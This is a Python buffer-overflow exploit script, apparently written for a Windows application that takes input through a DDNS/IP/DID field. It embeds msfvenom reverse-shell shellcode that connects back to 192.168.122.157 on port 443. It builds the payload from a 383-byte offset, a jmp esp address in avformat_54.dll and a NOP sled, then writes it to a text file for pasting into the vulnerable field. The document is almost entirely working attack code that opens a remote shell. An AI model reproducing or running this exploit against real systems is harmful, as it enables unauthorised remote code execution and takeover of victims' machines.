# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.122.157 LPORT=443 -a x86 --platform windows -b '\x00\x0a\x0d' -f c
# 351 bytes
shellcode = ("\xba\xfa\xd0\x13\x95\xda\xc7\xd9\x74\x24\xf4\x5e\x31\xc9\xb1"
"\x52\x31\x56\x12\x03\x56\x12\x83\x3c\xd4\xf1\x60\x3c\x3d\x77"
"\x8a\xbc\xbe\x18\x02\x59\x8f\x18\x70\x2a\xa0\xa8\xf2\x7e\x4d"
"\x42\x56\x6a\xc6\x26\x7f\x9d\x6f\x8c\x59\x90\x70\xbd\x9a\xb3"
"\xf2\xbc\xce\x13\xca\x0e\x03\x52\x0b\x72\xee\x06\xc4\xf8\x5d"
"\xb6\x61\xb4\x5d\x3d\x39\x58\xe6\xa2\x8a\x5b\xc7\x75\x80\x05"
"\xc7\x74\x45\x3e\x4e\x6e\x8a\x7b\x18\x05\x78\xf7\x9b\xcf\xb0"
"\xf8\x30\x2e\x7d\x0b\x48\x77\xba\xf4\x3f\x81\xb8\x89\x47\x56"
"\xc2\x55\xcd\x4c\x64\x1d\x75\xa8\x94\xf2\xe0\x3b\x9a\xbf\x67"
"\x63\xbf\x3e\xab\x18\xbb\xcb\x4a\xce\x4d\x8f\x68\xca\x16\x4b"
"\x10\x4b\xf3\x3a\x2d\x8b\x5c\xe2\x8b\xc0\x71\xf7\xa1\x8b\x1d"
"\x34\x88\x33\xde\x52\x9b\x40\xec\xfd\x37\xce\x5c\x75\x9e\x09"
"\xa2\xac\x66\x85\x5d\x4f\x97\x8c\x99\x1b\xc7\xa6\x08\x24\x8c"
"\x36\xb4\xf1\x03\x66\x1a\xaa\xe3\xd6\xda\x1a\x8c\x3c\xd5\x45"
"\xac\x3f\x3f\xee\x47\xba\xa8\xd1\x30\xbe\xb5\xba\x42\x3e\xc7"
"\x81\xca\xd8\xad\xe5\x9a\x73\x5a\x9f\x86\x0f\xfb\x60\x1d\x6a"
"\x3b\xea\x92\x8b\xf2\x1b\xde\x9f\x63\xec\x95\xfd\x22\xf3\x03"
"\x69\xa8\x66\xc8\x69\xa7\x9a\x47\x3e\xe0\x6d\x9e\xaa\x1c\xd7"
"\x08\xc8\xdc\x81\x73\x48\x3b\x72\x7d\x51\xce\xce\x59\x41\x16"
"\xce\xe5\x35\xc6\x99\xb3\xe3\xa0\x73\x72\x5d\x7b\x2f\xdc\x09"
"\xfa\x03\xdf\x4f\x03\x4e\xa9\xaf\xb2\x27\xec\xd0\x7b\xa0\xf8"
"\xa9\x61\x50\x06\x60\x22\x60\x4d\x28\x03\xe9\x08\xb9\x11\x74"
"\xab\x14\x55\x81\x28\x9c\x26\x76\x30\xd5\x23\x32\xf6\x06\x5e"
"\x2b\x93\x28\xcd\x4c\xb6")

buf = "A"*383                   # offset
buf += "\xe3\xb5\xa0\x69"       # jmp esp avformat_54.dll
# nopsled
buf += "\x90"*(800-383-4-len(shellcode)) + shellcode

# put file contents into DDNS/IP/DID field
with open("vivalepen.txt", "w") as f:
	f.write(buf)
	f.close()
